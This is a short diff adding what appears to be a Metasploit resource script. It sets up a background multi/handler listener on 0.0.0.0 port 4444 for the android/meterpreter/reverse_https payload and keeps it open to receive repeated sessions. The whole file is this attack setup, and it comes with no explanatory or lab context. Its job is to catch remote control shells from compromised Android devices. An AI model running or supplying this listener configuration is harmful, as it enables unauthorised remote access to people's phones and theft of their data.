@@ -1,0 +1,11 @@
+use multi/handler
+
+set payload android/meterpreter/reverse_https
+
+set lhost 0.0.0.0
+
+set lport 4444
+
+set ExitOnSession false
+
+exploit -j
